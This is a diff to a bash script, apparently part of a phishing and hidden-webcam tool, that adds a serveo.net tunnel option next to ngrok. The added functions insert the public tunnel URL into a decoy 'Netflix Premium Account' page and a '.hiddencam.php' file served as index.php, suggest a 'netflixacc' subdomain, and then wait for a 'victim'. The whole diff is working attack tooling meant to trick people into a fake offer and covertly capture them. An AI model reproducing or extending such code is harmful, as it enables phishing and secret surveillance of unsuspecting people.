@@ -114,6 +114,13 @@ sed 's+forwarding_link+'$ngroklink'+g' .tahmidrayat.iso > .NetFlix-Premium-Accou
 sed 's+forwarding_link+'$ngroklink'+g' .hiddencam.php > index.php
 
 }
+initialize_serveo() {
+
+serveolink=$(grep -o "https://[0-9a-z]*\.serveo.net" .servlink)
+sed 's+forwarding_link+'$serveolink'+g' .tahmidrayat.iso > .NetFlix-Premium-Account.html
+sed 's+forwarding_link+'$serveolink'+g' .hiddencam.php > index.php
+
+}
 start_ngrok() {
 
 if [[ -e ngrok ]]; then
@@ -161,7 +168,31 @@ initialize_ngrok
 victimfound
 }
 
+start_serveo() {
 
+default_choose_sub="Y"
+default_subdomain="netflixacc$RANDOM"
+def_port="5555"
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
+read port
+port="${port:-${def_port}}"
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Want any Subdomain? (Default:\e[0m\e[1;77m \e[1;31m[\e[1;33mY\e[1;31m/\e[1;33mn\e[1;31m] : \e[0m\e[1;96m'
+read choose_sub
+choose_sub="${choose_sub:-${default_choose_sub}}"
+if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
+subdomain_resp=true
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input your Subdomain: (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $default_subdomain
+read subdomain
+subdomain="${subdomain:-${default_subdomain}}"
+fi
+
+start_serveo2
+initialize_serveo
+victimfound
+
+}
 
 banner
 req
